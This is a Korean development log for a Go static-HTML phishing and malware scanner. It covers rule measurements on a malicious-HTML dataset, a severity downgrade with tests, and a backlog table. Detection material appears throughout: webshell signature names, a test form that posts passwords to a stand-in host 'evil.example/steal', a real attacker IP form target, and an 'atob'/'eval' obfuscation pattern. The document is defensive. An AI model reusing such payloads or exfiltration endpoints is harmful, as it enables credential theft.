xn--24-c61jimp7minn36pf8e → 사법정보포털24
xn--ob0bw4rpmfg7c7pt6cr8j → 공소열람서비스
xn--zj4b17icybw3m         → 인증센터
```

**만들지 않기로 했다.** 이유는 셋이다.

1. 우리가 가진 악성 표본에 **대상이 0건**이다.
2. 정상 표본에도 punycode 가 **0건**이라 **오탐을 잴 음성 케이스를 만들 수 없다.** 규칙 추가 절차 2번("실제 페이지에서 몇 건 나오는지 먼저 잰다")과 3번("음성 케이스를 먼저 쓴다")을 지킬 수 없는 상태다.
3. 한국 피싱이 실제로 쓰는 수법은 위조가 아니라 **의미로 속이는 것**이다(§12.23). 그건 도메인 문자열이 아니라 HTML 을 봐야 잡힌다.

지금 만들면 **한 번도 발동하지 않는 규칙**과, 그것을 위해 손으로 관리할 표가 남는다. 원본 프로젝트가 실패한 모양이 정확히 그것이었다(§9).

**다시 볼 조건을 적어 둔다** — 새 표본에서 **키릴·그리스 단일 체계 라벨이 1건이라도** 나오면 그때 만든다. 조건 없이 "보류"라고만 적어 두면 판단이 아니라 방치가 된다.

곁가지로, punycode 63개의 최상위 도메인은 `.com` 45 · `.me` 13 · `.co` 4 · `.net` 1 이었다. "한글 라벨인데 한국 최상위 도메인이 아니다"도 신호가 될 법하지만, **정상 쪽 표본이 0건이라 오탐률을 잴 수 없다.** 같은 이유로 미룬다.

---

### 12.37 악성 HTML 24,636개 — 처음으로 진짜 악성에 대보다 (2026-09-19)

C-TAS 머신러닝용 데이터셋이 도착했다. **피싱 페이지가 아니라 악성코드 분류별 HTML**(backdoor 132 · downloader 1,043 · exploit.kit 1,600 · miner 10,000 · ransomware 323 · trojan 10,000 · virus 841 · worm 697)이고, 원본 HTML 이 아니라 **특징값**(바이트 통계·바이트 그림·`strings`)이다. `strings` 가 줄 단위로 자른 원본이라(글자 합이 원본의 95~98%) 줄바꿈으로 이어 되살렸다. 압축은 풀지 않고, 되살린 HTML 은 디스크에 쓰지 않았다.

**이 데이터로 잴 수 없는 것**: 비ASCII 가 전부 빠져 있어 유니코드 규칙(`zero-width`·`mixed-script-host` 의 유니코드 표기)은 못 잰다. 페이지 URL 이 없어 출처 규칙은 설계대로 물러난다 — 가짜 URL 을 넣으면 모든 외부 링크가 "외부"가 되어 부풀려지므로 넣지 않았다.

| 분류 | 표본 | 발견 있음 | HIGH 있음 |
|---|---|---|---|
| backdoor | 132 | 83% | 0% |
| downloader | 1,043 | 57% | 0.3% |
| exploit.kit | 1,600 | 51% | 1.4% |
| miner | 10,000 | 99.7% | 58% (착시) |
| ransomware | 323 | 100% | 0% |
| trojan | 10,000 | 92% | 2.9% |
| virus | 841 | 96% | 0% |
| worm | 697 | 44% | 0.9% |

**① `webshell-signature` 가 웹셸 132개 중 0개를 잡았다.** 시그니처(`c99shell`·`r57shell`·`byroenet`)는 표본 안에 75번 나오는데 `<script>` 안에는 **0번**이다. 웹셸은 서버가 그리는 관리 화면이라 이름이 제목·본문에 있다. 이식할 때 "스크립트 본문을 볼 수 있다"는 이유로 스크립트 안만 보게 했는데, **그 전제가 실제 표본에서 틀렸다.** C-TAS 도메인에서 `mixed-script-host` 가 63건 중 0건이었던 것(§12.23)과 같은 모양 — 규칙이 구조적으로 못 보는 자리를 보고 있었다.

**② `cleartext-credentials` 의 HIGH 는 우리 원칙과 부딪힌다.** 걸린 것은 악성코드가 아니라 악성코드가 심긴 **피해 사이트의 http 로그인 폼**이었다(포럼·쇼핑몰 37곳). http 로 비밀번호를 보내는 건 사실이지만 개발자의 실수다. §3 은 "HIGH 는 공격자의 흔적만"이라고 정해 두었다. 정상 코퍼스가 전부 https 라 이 충돌이 지금껏 드러나지 않았다.

**③ 표본이 심하게 중복돼 있다.** miner 의 HIGH 5,798건 중 **5,684건이 한 포럼**(채굴 스크립트가 심긴 페이지를 페이지마다 수집)이었다. 이 데이터셋으로 비율을 말하려면 먼저 사이트·틀 단위로 중복을 걸러야 한다.

진짜로 보이는 HIGH 는 `form-action-ip` 9건(`http://69.31.86.221/se.php`)과 `data-uri-document` 4건. 발견이 하나도 없는 표본이 exploit.kit 49% · downloader 43% · worm 56% 로 재현율 구멍이 크다.

**남은 결정**: ~~A `cleartext-credentials` HIGH → MEDIUM~~ 57교시에 끝냈다(§12.38) · B `webshell-signature` 가 본문도 보게(언급만 하는 보안 기사와 가를 조건을 먼저 잰다) · C 중복 제거 뒤 재현율 구멍 분석.

### 12.38 평문 로그인 폼은 MEDIUM — 등급도 출력 계약이다 (57교시)

§12.37 ② 의 결정이다. http 로 비밀번호를 보내는 폼은 공격자도 만들 수 있지만 **평범한 개발자도 똑같이 만든다.** 이 신호 하나로는 둘을 가를 수 없으니 §3 대로 HIGH 에서 내린다. 공격자가 비밀번호를 남의 서버로 빼돌리는 경우는 다른 규칙이 HIGH 로 잡는다 — 내리기 전에 두 경우를 돌려 확인했다.

| 폼 | 내리기 전 | 내린 뒤 |
|---|---|---|
| https 은행 페이지 → `http://evil.example/steal` | `cross-origin-password-form` HIGH + `cleartext-credentials` HIGH | `cross-origin-password-form` **HIGH 그대로** |
| http 페이지 → 자기 서버 `/login` | `cleartext-credentials` HIGH 하나뿐 | MEDIUM |

분류(`exfiltration`)는 그대로 뒀다. `Class` 는 심각도와 독립이라고 처음부터 정해 두었다(§11).

**등급을 바꿔도 테스트가 하나도 깨지지 않았다.** 스크래치패드에서 `Severity: High` 를 `Medium` 으로 바꾸고 전체를 돌리니 전부 통과했다. 규칙이 **뜨는지**는 표로 단단히 묶여 있었지만 **몇 등급으로 뜨는지**는 아무도 붙잡고 있지 않았다. 등급은 종료 코드(`-min high`)와 API 의 `severity` 를 정하는 출력 계약인데, 실수로 바뀌어도 모르는 상태였다. 그래서 순서를 뒤집었다 — 등급을 붙잡는 테스트를 먼저 넣어 빨강을 보고(6건 실패), 그다음 코드 한 줄을 바꿨다.

테스트는 표의 **양성 표본 전부**에 `f.Severity != Medium` 을 단언한다. 변이 3건으로 모양을 정했다.

| 변이 | 결과 | 알려준 것 |
|---|---|---|
| `Medium` 대신 `Low` | 6건 실패 | "HIGH 가 아니다"를 단언하면 LOW·INFO 로 잘못 내려가도 통과한다 — **정확한 값**을 단언한다 |
| 규칙이 아예 안 뜸 | `발견되지 않음` 6건 | 찾은 것이 없는 루프는 아무것도 검사하지 않고 통과한다 — `findFirst` 의 `ok` 가 막는다 |
| `http://` 경로만 HIGH 로 남김 | 4건 실패 · 2건 통과 | 규칙에 경로가 둘이라 표본 하나만 골랐다면 절반 확률로 놓친다 |

**재측정** (§12.37 과 같은 24,636표본, 같은 도구):

| | 내리기 전 | 내린 뒤 |
|---|---:|---:|
| HIGH 가 뜬 표본 | 6,120 (24.8%) | **12** (0.05%) |
| 발견이 있는 표본 | 22,112 | 22,112 |

남은 12개는 §12.37 에서 진짜로 보인다고 했던 것들이다 — `form-action-ip` 9 · `data-uri-document` 3. 발견 수가 그대로인 것은 규칙을 끈 게 아니라 등급만 옮겼다는 확인이다. 바뀐 계약은 둘이다: `-min high` 로 돌리면 http 로그인 폼만 있는 페이지의 종료 코드가 1 → 0, API 응답의 `severity` 가 `"MEDIUM"`. CI 스모크는 그대로다 — 악성 표본의 HIGH 3건(`exfil-channel`·`cross-origin-password-form`·`webshell-signature`)은 이 규칙과 무관하다.

> 정상 코퍼스가 전부 https 라 §3 과의 충돌이 지금껏 안 보였다. **음성 표본만으로는 등급이 옳은지 알 수 없다** — "정상에 안 뜬다"는 것만 확인할 뿐, 뜬 것이 공격자의 흔적인지는 악성 표본에 대 봐야 드러났다.

---

## 13. 탐지 ≠ 취약점

> **탐지** — 패턴이 존재한다
> **취약점** — 공격자가 제어하는 입력이 그 자리에 도달한다

정적 HTML만 보는 스캐너는 후자를 **증명할 수 없다.** 입력의 출처(taint source)를 모르기 때문이다.

현재 인라인 핸들러 5건은 전부 개발자가 하드코딩한 문자열이다. 그래서 이렇게 보고해야 정확하다:

> "인라인 이벤트 핸들러가 5곳 있다. 이 페이지는 `script-src 'unsafe-inline'` 없이는 CSP를 적용할 수 없다."

XSS 취약점이 아니라 **CSP 도입을 가로막는 요소**다. 심각도를 처음부터 타입으로 넣은 이유이기도 하다 — 80건을 빨갛게 띄우면 진짜 문제 5건까지 같이 무시당한다.

---

## 14. 남은 것

### 원본 이식은 끝났다

97개 항목 중 **검증 가능한 것은 전부 가져왔고, 검증 불가능한 것은 전부 버렸다.**

| 판정 | 개수 | 결과 |
|---|---:|---|
| 이미 구현 · 이식 완료 | 18 | 규칙 21종에 반영 |
| 조합 재료로 사용 | 3 | `cleartext-credentials` 등의 논리곱 항으로 |
| 버림 | ~76 | 유사도 · 임계값 · 누락 · 푸터 · 키워드 · MITRE · Combined |

### 남은 항목

| 항목 | 상태 | 비고 |
|---|---|---|
| 전체 이름 참조 표 | 보류 | 2231개. 우회에 실제로 쓰이는 35개는 구현됨 |
| `<input form="id">`·`<button form="id">` | **완료** | id → form 맵 + `OwnerForm` (§12.16) |
| 전체 트리 구성 | **필요 없음으로 정리** | 보류 셋 중 둘은 맵·스택으로 풀렸고(§12.16), 남았던 foster parenting 은 **측정 결과 우리 규칙에 영향이 없었다**(§12.34) |
| punycode 디코더 | **완료** | RFC 3492 직접 구현 · 독립 구현과 대조 (§12.19) |
| 혼합 스크립트 규칙 | **완료** | 라틴·키릴·그리스 혼합, HIGH origin (§12.20) |
| 단일 체계 위조(`аррӏе`) | **만들지 않음** | 대상 0건·음성 표본 0건 — 다시 볼 조건을 적어 뒀다 (§12.20 · §12.36) |
| 정상 페이지 코퍼스 | **완료** | 21쪽(처음 12쪽에서 넓힘) · `corpus_test.go` 가 `HIGH == 0` 을 강제 (§12.7·12.8) |
| eTLD+1 접미사 표 | 부분 | 39개 내장 — 실측으로 고름(§12.35). 표에 없으면 마지막 두 라벨로 떨어진다 — **미탐 방향** |
| 이모지 범위 근사 | 한계 | 유니코드 `Emoji` 속성이 Go 표준에 없어 주요 블록 4개로 근사 (§12.18) |
| 시험받지 않은 규칙 | **첫 실측** | C-TAS 악성 HTML 24,636개에서 HIGH 가 뜬 규칙은 3종뿐. `webshell-signature` 0/132 (§12.37) · `cleartext-credentials` 원칙 충돌 → **MEDIUM 으로 내림**, HIGH 표본 6,120 → 12 (§12.38) |
| ~~SSRF 방어 `fetcher`~~ | **완료** | 주소 검증(§12.25) · DNS 재바인딩 방어(§12.26). 변이 검사 26/26 |
| ~~수집기 자원 제한~~ | **완료** | 타임아웃·크기·홉 수·scheme 재검사. 조용한 절단이 미탐을 만든다 (§12.27) |
| ~~출력 이스케이프~~ | **옮겨 감** | Go 쪽 `report/` 는 구조 변경으로 삭제. 개념은 `index.html` JS 로 (§12.28 · §12.29) |
| ~~웹 계층~~ | **완료** | JSON API `POST /api/scan` · 배포 구조 확정으로 HTML 서빙에서 전환 (§12.29) |
| 결과를 안전하게 그리기 | 범위 밖 | my_homepage 는 사용자가 나중에 작업 — 요구사항은 명세 문서로 넘긴다 (§12.29) |
| ~~Dockerfile~~ | **완료** | scratch + 인증서 · 비루트 · 허용 목록 .dockerignore · go1.27 (§12.30) |
| ~~명세 문서~~ | **완료** | `docs/INTEGRATION.md` — compose 로 끝에서 끝까지 검증 (§12.31) |
| ~~SHA 요청 로그~~ | **완료** | JSON 한 줄 · 원인 종류 · scheme·host 만 — 오류 문자열·쿼리는 남기지 않는다 (§12.32) |
| ~~CI `govulncheck`~~ | **완료** | 푸시·PR·주간 schedule. 새 패치가 나오면 빨간불로 go.mod 을 올리라고 알린다 (§12.33) |
| Docker Hub 공개 | 나중 | 멀티 아키텍처 빌드 · 버전 태그 · 받는 사람의 포트 노출 안내 (CLAUDE.md 7절) |
| 한글 IDN 피싱 | 한계 | 의미로 속이는 것이라 도메인 문자열로는 못 잡는다 (§12.23) |
| 변수를 거친 `eval` | 한계 | `var d=atob(x); eval(d)` — 변수 추적이 필요하다 (§12.21) |
| `formaction` 덮어쓰기 | **완료** | 폼 규칙 5종 모두 반영 (§12.10) |
| 주입 측정의 영구 테스트화 | **완료** | `inject_test.go` — 24종 × 4위치 × 12쪽 (§12.11) |
| `<noscript>` 원시 텍스트 | **완료** | 스크립트가 켜진 브라우저 기준 (§12.12) |
| `noscript-breakout` 규칙 | **완료** | MEDIUM evasion (§12.13) |
| `noscript-breakout` HIGH 조합 | **기각** | 전제가 측정으로 반증됨 (§12.15) |
| 스크립트를 끈 사용자만 보는 공격 | 한계 | `<noscript>` 안의 폼·링크·meta refresh 는 분석하지 않는다 |
| 외래 콘텐츠(`<svg>`·`<math>`) | **보류(결정)** | 미탐 방향이나 트리 구성 없이는 정확히 못 한다. 근거는 §12.14 |
| `<input form="id">` 의 `formaction` | 미지원 | form 밖 버튼이 id 로 연결된 경우. `<input form>` 과 같은 한계 |
| SPA 렌더링 후 분석 | 범위 밖 | 헤드리스 브라우저 필요. 현재는 `Notes` 로 한계만 보고 |

주입 측정이 영구 테스트가 되면서 29~32교시에 찾은 결함 네 개(중첩 폼 오탐 · formaction 미탐 · textarea 무방비 · 문자열 속 `<script`)가 모두 테스트로 고정됐다.

> 이전 기록의 "미탐 기준은 합성 샘플 1개뿐"은 틀렸다 — §12.9 정정 참고.

### 이식하며 달라진 것

| 항목 | 원본 | 우리 구현 |
|---|---|---|
| 웹셸 시그니처 | H900 | 스크립트 **본문**을 실제로 볼 수 있다. 시그니처 4개로 좁게 유지 |
| 유출 채널 | H101 | `<form action>` + **스크립트 본문** |
| 제로폭 난독화 | H001 | 속성값만 보던 것을 **텍스트까지** |
| Cross-Origin 폼 | H302 | 열림/닫힘 반전 버그 수정 · 중첩 form · `@` userinfo |
| `eval()` 경고 | Log_Warn | 단독은 노이즈라 **디코더와의 조합**일 때만 |
| `data:` URI | H206·H702 | **길이 임계값을 버리고** 타입 × 컨텍스트로 |
| iframe sandbox | H204 | **누락은 버리고** 토큰 남용만 |
| 위험 확장자 | H609 | 설치 파일(exe·msi·jar)은 **정상 배포**라 제외 |
| 평문 자격증명 | H303+H311 | 두 항목을 **논리곱** 하나로 |
| 비밀번호 필드 | H306/H307 | 검사 대상을 `input` 의 `name`/`id`/`autocomplete` 로 한정 |
| WAF 차단 페이지 | H901 | **발견이 아니라 `Notes`** — 대상에 대한 판정이 아니다 |
| 피싱 경고 페이지 | H104 | HIGH 발견 + `Notes`. **제3자 판정임을 Evidence 에 명시** |

## 15. 반복해서 확인하는 것

- **`pos`가 반드시 전진하는가** — 새 상태를 추가할 때마다 모든 경로를 확인한다. 이제 `FuzzTokenizer` 가 자동으로 검사한다.
- **`go build` → `go vet` → `go test`** 순서 — `go build` 는 `_test.go` 를 컴파일하지 않는다.
- **테스트 실패 시 첫 질문** — "코드가 틀렸나, 기대값이 낡았나?"
- **음성 전부 통과 + 양성 전부 실패** — 규칙이 아예 호출되지 않거나 이름이 안 맞는다는 신호다. 로직 버그면 이렇게 깔끔하게 갈리지 않는다.
- **경과 시간과 실행 수를 먼저 보라** — 30초를 지정했는데 0.3초에 끝났다면 아무것도 안 돈 것이다.
- **같은 줄 번호에서 에러가 여러 번, 값이 조금씩 커지며 찍힌다** — 판정이 집계 루프 **안**에 있다. 집계가 끝나기 전에 판정하고 있는 것이다.
- **정상 페이지에서 HIGH 가 나오면 규칙이 틀린 것이다** — 이제 `TestCorpusNoFalsePositive` 가 12쪽에 대해 자동으로 검사한다.

### 도구가 못 잡은 결함들

전부 컴파일러도 `go vet` 도 통과시켰다. **테스트와 CI가 유일한 방어선이었다.**

| 결함 | 증상 | 잡은 것 |
|---|---|---|
| `if t.isTagStart()` 에서 `!` 누락 | 무한 루프 | 실행 |
| `s = s` (자기 대입) | `//cdn.x/` 도메인이 빈 문자열 | 테스트 |
| `finisher` 호출 루프 누락 | 닫히지 않은 `<form>` 을 보고하지 않음 | 테스트 |
| `" atob("` 앞 공백 하나 | **가장 흔한 난독화 형태를 통째로 놓침** | 테스트 |
| `"iframe-snadbox-escape"` 오타 | 규칙이 영원히 0건 | 테스트 |
| `ruleObfuscateEval` 중복 등록 | 발견이 2배 | 테스트 |
| `countCode` 를 제품 코드에 배치 | 테스트 헬퍼가 최종 빌드에 포함 | 리뷰 |
| `urlMixedContent` 죽은 함수 | 미등록 + `https` 를 평문으로 오판 | 리뷰 |
| `.gitignore` 의 `coverage.*` | `scanner/coverage.go` 가 커밋되지 않음 | **CI** |
| 판정을 집계 루프 **안**에 배치 | 같은 줄에서 에러가 값이 커지며 반복 | 테스트 |
| 리팩터링 후 `flag.PrintDefaults()` · `fmt.Printf` 잔존 | 출력에 `-test.v` 가 찍힘 · 버퍼가 빔 | 테스트 |
| 폼 규칙 2종이 스택을 건너뜀 | 브라우저가 무시하는 중첩 폼에 HIGH | **주입 측정** |
| `tok.Name == "nosciript"` 오타 | 음성 전부 통과 + 양성 전부 0건 | 테스트 |
| 수정만 넣고 테스트 케이스 누락 | 수정을 되돌려도 전부 통과 | 결함 주입 |
| 추적기를 규칙 **뒤에** 호출 | 건수는 대부분 맞고 **위치만 한 토큰 밀림** | 위치 단언 테스트 |
| (심은 결함) `textarea` 원시 텍스트 제거 | 기존 테스트 0개 실패 — 디코딩만 검사했다 | **주입 테스트** |
| (심은 결함) escaped 확인 없는 이중 이스케이프 | 기존·주입 테스트 모두 0개 | 단위 테스트 추가 |

`.gitignore` 항목은 로컬 테스트로 절대 잡히지 않는다. 러너는 git 서버에서 clone 하므로 **커밋되지 않은 파일은 존재하지 않는다.**

- **`.gitignore` 패턴에는 `/` 를 붙인다** — `coverage.*` 는 어느 깊이에서든 잡는다. `/coverage.out` 이어야 루트만 잡는다.
- **큰 변경 뒤에는 퍼징을 길게** — CI의 30초는 회귀 방지용이지 탐색용이 아니다.
- **출력에 `-test.` 플래그가 보이면** — 코드 어딘가가 전역 `flag` 를 건드리고 있다.
- **측정 스크립트가 빌드 실패를 놓치지 않게 한다** — `--- FAIL` 만 세면 컴파일 오류가 "결함 미검출"로 둔갑한다. (`go run` 종료 코드 · zsh 변수 분할 · ugrep 괄호에 이어 네 번째 측정 도구 함정)
- **테스트 결과가 방금 고친 코드와 안 맞으면 저장부터 확인한다** — `go test` 는 에디터 화면이 아니라 디스크의 파일을 컴파일한다.
- **새 테스트를 넣기 전에 "이게 없으면 무엇을 놓치나"를 잰다** — 결함을 심어 기존 테스트와 비교한다. 아무것도 더 잡지 못하면 느려질 이유가 없다.
- **건수 테스트는 위치를 보지 않는다** — 관찰자·추적기의 호출 순서를 바꿨다면 발견 위치를 단언하는 테스트가 있는지 확인한다.
- **규칙은 구조를 직접 판단하지 말고 스택에 묻는다** — 토큰만 보고 "폼이다"라고 판단하면 브라우저가 버린 폼까지 본다.
- **수정 없이 테스트만 있으면 빨강이 보이고, 테스트 없이 수정만 있으면 아무것도 보이지 않는다.** 수정이 들어간 뒤에는 가드를 잠깐 지워 테스트가 실패하는지 확인한다.
